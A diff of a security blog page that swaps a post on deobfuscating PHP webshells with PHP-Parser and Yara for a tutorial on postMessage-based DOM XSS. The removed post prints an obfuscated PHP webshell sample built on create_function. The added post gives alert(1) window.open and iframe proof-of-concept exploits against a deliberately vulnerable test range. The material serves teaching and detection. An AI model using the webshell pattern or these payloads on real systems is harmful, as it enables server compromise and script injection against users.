@@ -5,16 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>毕设项目:基于PHP-Parser进行反混淆与检测的规划 - RainSec</title>
+    <title>EventListener XSS - RainSec</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="RainSec,"> 
-    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,对于自己的毕设的一些功能的想法和未来该怎么做的一些规划
-
-
-毕设项目-基于PHP-Parser的反混淆前言大致设想是使用PHP-Parser完成反混淆，然后结合Yara进行检测。
-目前是没考虑过机器,"> 
+    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,EventListener XSSXSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是DOM型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听postMessage所,"> 
     <meta name="author" content="RainSec"> 
     <link rel="alternative" href="atom.xml" title="RainSec" type="application/atom+xml"> 
     <link rel="icon" href="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg"> 
@@ -80,7 +76,7 @@
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg" alt="" data-url="https://rainsec.cn">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">毕设项目:基于PHP-Parser进行反混淆与检测的规划</h3>
+        <h3 class="subtitle">EventListener XSS</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -105,23 +101,24 @@
             animation-duration: 1.2s;
             background-image: 
                 radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url('/img/cover.jpg') ">
+                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/XSS_cover.jpg') ">
         </div>
         <div class="else">
             <p class="animated fadeInDown">
                 
-                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                <a href="/categories/Noel"><b>「
+                    </b>NOEL<b> 」</b></a>
                 
-                February 10, 2022
+                March 25, 2022
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/post/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E3%81%AE%E6%83%B3%E6%B3%95.html" title="毕设项目:基于PHP-Parser进行反混淆与检测的规划" class="">毕设项目:基于PHP-Parser进行反混淆与检测的规划</a>
+            <h3 class="post-title animated fadeInDown"><a href="/post/EventListener%20XSS.html" title="EventListener XSS" class="">EventListener XSS</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    5k
+                    6k
                 </span>
                 
                 
@@ -140,7 +137,7 @@
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/PHP-Parser/" rel="tag">PHP-Parser</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/XSS/" rel="tag">XSS</a></li></ul>
             
         </div>
     </div>
@@ -161,136 +158,118 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <p>对于自己的毕设的一些功能的想法和未来该怎么做的一些规划</p>
-<span id="more"></span>
-
-<h1 id="毕设项目-基于PHP-Parser的反混淆"><a href="#毕设项目-基于PHP-Parser的反混淆" class="headerlink" title="毕设项目-基于PHP-Parser的反混淆"></a>毕设项目-基于PHP-Parser的反混淆</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大致设想是使用PHP-Parser完成反混淆，然后结合Yara进行检测。</p>
-<p>目前是没考虑过机器学习，后续可能会使用吧(<del>maybe</del></p>
-<h2 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h2><p>PHP-Parser基础来源于FeatureExtract中积累的操作</p>
-<p>根据Github上的反混淆项目和Deof项目进行改造，尽量理解两个项目的运行方式以及对待不同混淆时的操作</p>
-<h3 id="Deobf"><a href="#Deobf" class="headerlink" title="Deobf"></a>Deobf</h3><p>编写比较有逻辑，整体框架一目了然，对应文件的功能比较清晰</p>
-<p>但是现在功能不够全，对于一些情况目前无法处理，比如</p>
-<pre><code class="php">&lt;?php 
-$z0=$_REQUEST['sort'];
-$q1='';
-$c2="wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
-$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);
-foreach($y3 as $h4) {
-    $q1.=$c2[$h4];
-}
-$v5=strrev("noi"."tcnuf"."_eta"."erc");
-$j6=$v5("",$q1($z0));
-$j6();
-?&gt;
-</code></pre>
-<p>在<code>$j6=$v5("",$q1($z0));</code>这里不能直接反混淆出v5的值</p>
-<p>还有一些其他的功能没有实现，只实现了基础的反混淆，不过因为骨架已经搭好，未来应该在该项目基础上进行编写</p>
-<h3 id="一些常用的反混淆操作"><a href="#一些常用的反混淆操作" class="headerlink" title="一些常用的反混淆操作"></a>一些常用的反混淆操作</h3><h4 id="字符串函数直接返回值"><a href="#字符串函数直接返回值" class="headerlink" title="字符串函数直接返回值"></a>字符串函数直接返回值</h4><p>这里以base64_decode为例，后续可以把字符串操作函数放在数组里然后进行判断</p>
-<pre><code class="php">function leavenode($node){
-    if($node instanceof PhpParser\Node\Expr\FuncCall &amp;&amp; $node-&gt;name-&gt;parts[0] == "base64_decode"){
-        return new PhpParser\Node\Scalar\String_($node-&gt;name-&gt;parts[0]($node-&gt;args[0]-&gt;value-&gt;value));
-    }
+            <p><strong>EventListener XSS</strong><br>XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是<code>DOM</code>型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听<code>postMessage</code>所导致漏洞。首先从事件监听器开始说起</p>
+<h2 id="事件监听器"><a href="#事件监听器" class="headerlink" title="事件监听器"></a>事件监听器</h2><p>事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：</p>
+<pre><code class="HTML">&lt;table id="outside"&gt;
+    &lt;tr&gt;&lt;td id="t1"&gt;one&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;td id="t2"&gt;two&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;script&gt;
+function modifyText() {
+  var t2 = document.getElementById("t2");
+  if (t2.firstChild.nodeValue == "three") {
+    t2.firstChild.nodeValue = "two";
+  } else {
+    t2.firstChild.nodeValue = "three";
+  }
 }
 
-//例子如下
-&lt;?php
-base64_decode("UEhQLVBhcnNlcg");
---After parser:--
-    
-&lt;?php
-'PHP-Parser';
+// 为table添加事件监听器
+var el = document.getElementById("outside");
+el.addEventListener("click", modifyText, false);
+&lt;/script&gt;
 </code></pre>
-<h4 id="字符操作函数传递给变量然后动态调用"><a href="#字符操作函数传递给变量然后动态调用" class="headerlink" title="字符操作函数传递给变量然后动态调用"></a>字符操作函数传递给变量然后动态调用</h4><p>这个目前我没有啥好的想法，我的做法是设置两个Visitor，第一个Visitor遍历到函数声明的时候把函数名和函数值存在一个static数组里，第二个Visitor为进行操作的，当遍历到$node为函数调用时，去数组里进行查询，返回对应变量的值，然后返回成String_节点</p>
-<p>目前只写了针对单字符编码的测试，还有的函数需要多个参数，参数可能为字符也可能为变量，这里后续要考虑(初级想法是argv[]依次取出通过循环拼接命令，后续进行尝试)，还有要设计数据结构，变量可以给变量复制，是不是可以使用链表进行操作，终点指向字符串等。</p>
-<pre><code class="php">Class StrVisitor extends NodeVisitorAbstract{
-    public function __construct()
-    {
-        $this-&gt;variable = new Variable;
-    }
-
-    function leavenode($node){
-        if($node instanceof PhpParser\Node\Expr\Assign &amp;&amp; $node-&gt;var instanceof PhpParser\Node\Expr\Variable &amp;&amp; $node-&gt;expr instanceof PhpParser\Node\Scalar\String_) {
-            $this-&gt;variable-&gt;pushvariable($node-&gt;var-&gt;name,$node-&gt;expr-&gt;value);
-        }
-    }
-
-    function afterTraverse(array $nodes)
-    {
-        $this-&gt;variable-&gt;output();
-    }
-}
-
-Class FuncVisitor extends NodeVisitorAbstract{
-    public function __construct()
-    {
-        $this-&gt;variable = new Variable;
-    }
-
-    function leavenode($node){
-        if($node instanceof PhpParser\Node\Expr\FuncCall &amp;&amp; $node-&gt;name instanceof PhpParser\Node\Expr\Variable) {
-            $value = $node-&gt;args[0]-&gt;value-&gt;value;
-            $name = $this-&gt;variable-&gt;popvariable($node-&gt;name-&gt;name);
-            if($name){
-                return new Node\Scalar\String_($name($value));
-            }
-        }
-    }
-}
-
-Class Variable{
-    static $variablelist = [];
-    public function pushvariable($variablename,$variablevalue){
-        self::$variablelist[$variablename] = $variablevalue;
-    }
-
-    public function popvariable($variablename){
-        if(isset(self::$variablelist[$variablename])){
-            return self::$variablelist[$variablename];
-        }else{
-            return 0;
-        }
-    }
-
-    public function output(){
-        var_dump(self::$variablelist);
-    }
+<p>以上代码监听了<code>table</code>的<code>click</code>事件，当点击<code>table</code>时会触发<code>modifyText</code>,下面链接列出了所有的事件:</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Events#event_index">https://developer.mozilla.org/en-US/docs/Web/Events#event_index</a></p>
+<p>这里要说的是<code>postMessage</code>与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下<code>postMessage</code>的介绍：</p>
+<p>&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <code>Document.domain</code>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要<strong>正确的使用</strong>，这种方法就很安全。 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p>
+<p>它的用法也很简单：</p>
+<pre><code>windows.postMessage(message, targetOrigin, [transfer])
+</code></pre>
+<ul>
+<li><p>windows是指一个窗口，可以是当前页面的<code>window</code>、<code>window.open</code>返回的窗口对象、<code>iframe</code>的<code>contentWindow</code>属性等</p>
+</li>
+<li><p>message是要发送的消息，可以是字符串，也可以是<code>json</code>格式</p>
+</li>
+<li><p><code>targetOrigin</code>用来指定哪个窗口可以接收到消息，如果为<code>*</code>则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。</p>
+</li>
+</ul>
+<p>发送消息事件可以通过如下方式添加监听事件：</p>
+<pre><code class="JavaScript">window.addEventListener("message", receiveMessage, false);
+function receiveMessage(event)
+{
 }
 </code></pre>
-<p>测试如下</p>
-<pre><code class="php">&lt;?php
-$a = 'base64_decode';
-$b = 'str_rot13';
-$c = 'chr';
-$d = 'strtolower';
+<p>当发送信息时就会触发<code>receiveMessage</code>。其中<code>event</code>的属性比较重要的有：</p>
+<ul>
+<li><p>data 即<code>postMessage</code>发送的数据</p>
+</li>
+<li><p>origin 发送信息窗口的<code>origin</code></p>
+</li>
+</ul>
+<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码</p>
+<pre><code class="HTML">&lt;html&gt;
+  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      var postMessageHandler = function(msg) {
+  var content = msg.data;
+  var msgObj = eval(content);
 
-$d('@_POST');
-$c(97);
-$b('CUC-Cnefre');
+  if (msgObj.isActive) {
+    document.write("PostMessage arrived!");
+  }
+}
 
---After parser:--
+window.addEventListener('message', postMessageHandler, false);
 
-&lt;?php
-
-$a = 'base64_decode';
-$b = 'str_rot13';
-$c = 'chr';
-$d = 'strtolower';
-'@_post';
-'a';
-'PHP-Parser';
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;
 </code></pre>
-<p>针对preg_replace这种多参数函数，php_deobf可以进行混淆出来，后续看一下怎么实现的<br><del>这里挖个坑，每天补一点</del></p>
-<h2 id="Yara"><a href="#Yara" class="headerlink" title="Yara"></a>Yara</h2><p>Yara规则依靠于积累的规则和开源项目例如</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ruppde/yara_rules/blob/f375dbafa7b6aabd4e8fe8506a9e3ab9b8a57cbd/webshell/gen_webshells.yar">yara_rules/gen_webshells.yar</a></p>
-<p>目前的想法是将工作的重点放在反混淆上，因为如果能将反混淆做的尽量彻底，那么规则就会很好写。</p>
-<h2 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h2><p>做一个后端或者直接在反混淆结束之后添加</p>
-<pre><code class="php">system("yara -r webshell/rule webshell/sample");
+<p>很明显可以看出这个页面在监听到<code>postMessage</code>时会调用<code>eval</code>执行发送的信息，那我们就可以构造<code>payload</code>了</p>
+<pre><code class="HTML">&lt;script&gt;
+                    function pocLink() {
+                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');
+                        let msg = "alert(1);";
+
+                        setTimeout(function(){
+                            win.postMessage(msg, '*');
+                        }, 5000);
+                    }
+&lt;/script&gt;
+ &lt;a href="#" onclick="pocLink();"&gt;PoC link&lt;/a&gt;         
 </code></pre>
-<p>如果有时间还是想做一个好看的后端</p>
-<h2 id="短期要做的事"><a href="#短期要做的事" class="headerlink" title="短期要做的事"></a>短期要做的事</h2><ul>
-<li>看一下**<a target="_blank" rel="noopener" href="https://github.com/L2ksy0d/PHPDeobfuscator">PHPDeobfuscator</a>**是怎么解决变量值的存储和后续替换的(目前的想法是如果遍历到遍历声明或者变量赋值，就把变量名和值传给一个数组，当后续遇到变量被调用时从数组调值进行替换，明天试试)</li>
-<li>将Deobf当前的功能理清楚然后将目前已经可以做的补充进去</li>
-<li>调研一下后端的建设情况</li>
+<p>或者是使用<code>iframe</code></p>
+<pre><code class="HTML">&lt;script&gt;
+
+  function pocFrame(win) {           
+    let msg = "alert(1);";
+
+    win.postMessage(msg, '*');          
+  }
+&lt;/script&gt;
+ &lt;iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" onload="pocFrame(this.contentWindow)"&gt;&lt;/iframe&gt;    
+</code></pre>
+<p>也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个<code>iframe</code>并获取其句柄，用来传递信息。当打开的窗口中存在有<code>message</code>监听，且其触发代码有可利用点时就可以触发漏洞。</p>
+<h2 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h2><p>纯手工发现漏洞不可取，<code>Burp</code>的<code>DOM Invader</code>就可以帮助发现此类问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image20.1l50zy96mokg.png" alt="img"></p>
+<p>对于<code>https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval</code> 它可以直接检测出漏洞存在并一键生成<code>POC</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image21.n4byv2n2acw.png" alt="img"></p>
+<p>为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替<a target="_blank" rel="noopener" href="https://github.com/fransr/postMessage-tracker">postMessage-tracker</a>入手进行分析。 其检测结果展示形式为</p>
+<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image22.6qq7cqyazzg0.png" alt="img"></p>
+<p>平平无奇的一个小框框，相较于<code>DOM Invader</code>的可利用性分析差了许多，不过仅仅了解下原理已然足够了。</p>
+<p>它的目录结构非常简单，首先看下<code>mainfest.json</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image23.1tng48w41gyo.png" alt="img"></p>
+<p><code>run_at</code>表明注入在<code>css</code>之后，<code>dom</code>构建之前。关键代码在<code>content_script.js</code>当中：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image24.6br43k6e3x00.png" alt="img"></p>
+<p>这一段的主要作用就是在添加监听器前判断其类型是否时<code>message</code>，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测<code>Burp</code>在此之上加入了危险函数判断的操作，后续有空的话就给<code>DOM Invader</code>加一个类似的功能练练手吧，日常使用当然还是<code>Burp</code>的香啊~</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/fransr/postMessage-tracker">https://github.com/fransr/postMessage-tracker</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">https://portswigger.net/burp/documentation/desktop/tools/dom-invader</a></p>
+</li>
 </ul>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
@@ -328,15 +307,21 @@ $d = 'strtolower';
         <div class="sidebar">
             <div class="box animated fadeInRight">
                 <div class="subbox">
-                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg" height=300 width=300></img>
-                    <p>RainSec</p>
-                    <span>致力于云原生安全和自动化渗透测试的研究与分享</span>
+                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220211/noel.47xsfyg7vt40.webp" height=300 width=300></img>
+                    <p>Noel</p>
+                    <span>无情的挖洞机器</span>
                     <dl>
                         
-                            
-                            
-                            
                         
+                            
+                                <dd>
+                                    <link rel="stylesheet" type="text/css" href="">
+                                    <a href="function link() { [native code] }" target="_blank"><span
+                                    class=" iconfont "></span></a>
+                                </dd>
+                            
+                            
+                            
                         
                     </dl>
                 </div>
@@ -352,7 +337,7 @@ $d = 'strtolower';
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%95%E8%AE%BE%E9%A1%B9%E7%9B%AE-%E5%9F%BA%E4%BA%8EPHP-Parser%E7%9A%84%E5%8F%8D%E6%B7%B7%E6%B7%86"><span class="toc-number">1.</span> <span class="toc-text">毕设项目-基于PHP-Parser的反混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%B7%B7%E6%B7%86"><span class="toc-number">1.2.</span> <span class="toc-text">反混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Deobf"><span class="toc-number">1.2.1.</span> <span class="toc-text">Deobf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.2.</span> <span class="toc-text">一些常用的反混淆操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yara"><span class="toc-number">1.3.</span> <span class="toc-text">Yara</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E8%80%85%E7%BB%93%E5%90%88"><span class="toc-number">1.4.</span> <span class="toc-text">两者结合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%9C%9F%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B"><span class="toc-number">1.5.</span> <span class="toc-text">短期要做的事</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">事件监听器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-number">2.</span> <span class="toc-text">漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">工具检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol>
                 </div>
             </div>
             
